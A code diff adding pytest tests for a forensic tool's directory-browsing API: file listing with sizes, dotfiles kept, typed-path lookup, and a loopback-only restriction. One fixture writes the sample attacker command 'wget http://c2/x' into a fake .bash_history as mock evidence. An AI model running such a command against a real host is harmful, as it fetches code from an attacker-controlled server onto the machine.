@@ -174,6 +174,57 @@ def test_browse_dir_lists_subdirectories(client, tmp_path):
     assert body["parent"] == str(tmp_path.parent)
 
 
+def test_browse_dir_files_mode_lists_everything_with_sizes(client, tmp_path):
+    """The import modal's "Add from this machine…" picker: files come back
+    with sizes, capped, and deliberately unfiltered — not by extension
+    (importability is the frontend's call) and not by dot prefix (on a
+    mounted *nix image, .bash_history IS the evidence). The folder-mode
+    callers don't ask and keep the old shape, cosmetic dot filter included."""
+    root = tmp_path / "browse"
+    root.mkdir()
+    (root / "evidence.csv").write_text("A,B\n1,2\n")
+    (root / ".bash_history").write_text("wget http://c2/x\n")
+    (root / ".ssh").mkdir()
+    (root / "sub").mkdir()
+
+    plain = client.get(f"/api/browse_dir?path={root}").json()
+    assert plain["dirs"] == ["sub"] and "files" not in plain
+
+    r = client.get(f"/api/browse_dir?path={root}&files=true").json()
+    assert r["dirs"] == [".ssh", "sub"]
+    assert {f["name"] for f in r["files"]} == {"evidence.csv", ".bash_history"}
+    assert next(f for f in r["files"] if f["name"] == "evidence.csv")["size"] == 8
+    assert r["truncated"] is False
+    assert r["limit"] > 0
+
+
+def test_browse_dir_files_mode_stats_a_typed_file_path(client, tmp_path):
+    """The picker's typed-path box hands its text straight here: a path that
+    names a file answers {picked} instead of 400, resolved by os.path on the
+    server — which is what makes a pasted path work past the listing cap
+    and regardless of separator style."""
+    root = tmp_path / "browse2"
+    root.mkdir()
+    f = root / "huge.csv"
+    f.write_text("A\n" * 10)
+    r = client.get(f"/api/browse_dir?path={f}&files=true").json()
+    assert r["picked"] == {"name": "huge.csv", "size": 20}
+    assert r["path"] == str(root)
+
+
+def test_browse_dir_files_mode_is_loopback_only(client, tmp_path, monkeypatch):
+    """Folder listing has always answered any peer the analyst chose to
+    bind, but disk-wide filename+size enumeration is gated to this machine
+    — the same stance the removed resolve_local route took."""
+    import server
+
+    monkeypatch.setattr(server, "_is_loopback", lambda request: False)
+    r = client.get(f"/api/browse_dir?path={tmp_path}&files=true")
+    assert r.status_code == 403
+    # folder mode is unchanged for the same peer
+    assert client.get(f"/api/browse_dir?path={tmp_path}").status_code == 200
+
+
 def test_browse_dir_rejects_non_directory(client, tmp_path):
     f = tmp_path / "not_a_dir.txt"
     f.write_text("x")
